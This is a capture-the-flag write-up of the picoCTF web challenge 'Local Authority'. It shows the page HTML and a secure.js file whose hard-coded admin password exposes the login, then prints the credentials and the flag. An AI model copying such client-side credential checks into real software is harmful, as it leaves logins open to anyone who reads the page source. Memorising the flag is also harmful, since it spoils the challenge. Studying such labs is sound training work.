            </div><h1 id="web-exploitation---local-authority---writeup">Web Exploitation - Local Authority - writeup</h1>
<h2 id="description">description</h2>
<p>Can you get the flag?
Go to this <!-- raw HTML omitted -->website<!-- raw HTML omitted --> and see what you can discover.</p>
<h2 id="writeup">writeup</h2>
<p>Once I open the link <!-- raw HTML omitted --><a href="http://saturn.picoctf.net:51419/" target="_blank" rel="noopener noreffer">http://saturn.picoctf.net:51419/</a><!-- raw HTML omitted --> in firefox I get to a page &ldquo;Secure Customer Portal&rdquo;.</p>
<p>I can see a login form with username and password.</p>
<p>On the website I see a hint:</p>
<blockquote>
<p>Only letters and numbers allowed for username and password.</p>
</blockquote>
<p>I tried to do a simple post request to the login.php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">username=admin&amp;password=test&amp;login=true
</span></span></code></pre></td></tr></table>
</div>
</div><p>Using that payload I get the following html response:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE html&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">&#34;en&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&#34;UTF-8&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;viewport&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;width=device-width, initial-scale=1.0&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">&#34;X-UA-Compatible&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;ie=edge&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;style.css&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Login Page<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;secure.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">p</span> <span class="na">id</span><span class="o">=</span><span class="s">&#39;msg&#39;</span><span class="p">&gt;&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">hidden</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;admin.php&#34;</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;post&#34;</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;hiddenAdminForm&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;hash&#34;</span> <span class="na">required</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;adminFormHash&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="kd">function</span> <span class="nx">filter</span><span class="p">(</span><span class="nx">string</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">filterPassed</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">string</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">          <span class="nx">cc</span> <span class="o">=</span> <span class="nx">string</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">          
</span></span><span class="line"><span class="cl">          <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="nx">cc</span> <span class="o">&gt;=</span> <span class="mi">48</span> <span class="o">&amp;&amp;</span> <span class="nx">cc</span> <span class="o">&lt;=</span> <span class="mi">57</span><span class="p">)</span> <span class="o">||</span>
</span></span><span class="line"><span class="cl">               <span class="p">(</span><span class="nx">cc</span> <span class="o">&gt;=</span> <span class="mi">65</span> <span class="o">&amp;&amp;</span> <span class="nx">cc</span> <span class="o">&lt;=</span> <span class="mi">90</span><span class="p">)</span> <span class="o">||</span>
</span></span><span class="line"><span class="cl">               <span class="p">(</span><span class="nx">cc</span> <span class="o">&gt;=</span> <span class="mi">97</span> <span class="o">&amp;&amp;</span> <span class="nx">cc</span> <span class="o">&lt;=</span> <span class="mi">122</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">          <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">filterPassed</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>     
</span></span><span class="line"><span class="cl">          <span class="p">}</span>
</span></span><span class="line"><span class="cl">          <span class="k">else</span>
</span></span><span class="line"><span class="cl">          <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">      <span class="nb">window</span><span class="p">.</span><span class="nx">username</span> <span class="o">=</span> <span class="s2">&#34;admin&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="nb">window</span><span class="p">.</span><span class="nx">password</span> <span class="o">=</span> <span class="s2">&#34;test&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      
</span></span><span class="line"><span class="cl">      <span class="nx">usernameFilterPassed</span> <span class="o">=</span> <span class="nx">filter</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">username</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nx">passwordFilterPassed</span> <span class="o">=</span> <span class="nx">filter</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">password</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="nx">usernameFilterPassed</span> <span class="o">&amp;&amp;</span> <span class="nx">passwordFilterPassed</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      
</span></span><span class="line"><span class="cl">        <span class="nx">loggedIn</span> <span class="o">=</span> <span class="nx">checkPassword</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">username</span><span class="p">,</span> <span class="nb">window</span><span class="p">.</span><span class="nx">password</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">loggedIn</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;msg&#39;</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="s2">&#34;Log In Successful&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;adminFormHash&#39;</span><span class="p">).</span><span class="nx">value</span> <span class="o">=</span> <span class="s2">&#34;2196812e91c29df34f5e217cfd639881&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;hiddenAdminForm&#39;</span><span class="p">).</span><span class="nx">submit</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;msg&#39;</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="s2">&#34;Log In Failed&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;msg&#39;</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="s2">&#34;Illegal character in username or password.&#34;</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Looking at that html code there are two lines that stick out:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">window.username = &#34;admin&#34;;
</span></span><span class="line"><span class="cl">window.password = &#34;test&#34;;
</span></span></code></pre></td></tr></table>
</div>
</div><p>Lets try the username &lsquo;admin&rsquo; and the password &rsquo;test&rsquo;&hellip;</p>
<p>No luck</p>
<p>The file &lsquo;secure.js&rsquo; seems to be more interesting &hellip;</p>
<p>Let&rsquo;s take a look at it:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">checkPassword</span><span class="p">(</span><span class="nx">username</span><span class="p">,</span> <span class="nx">password</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span> <span class="nx">username</span> <span class="o">===</span> <span class="s1">&#39;admin&#39;</span> <span class="o">&amp;&amp;</span> <span class="nx">password</span> <span class="o">===</span> <span class="s1">&#39;strongPassword098765&#39;</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>So the username seems to be &lsquo;admin&rsquo; and the password &lsquo;strongPassword098765&rsquo;</p>
<p>Using that combination the login was successful and I can see the flag:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">picoCTF{j5_15_7r4n5p4r3n7_d6a44d91} 
</span></span></code></pre></td></tr></table>
</div>
</div>]]></description></item></channel></rss>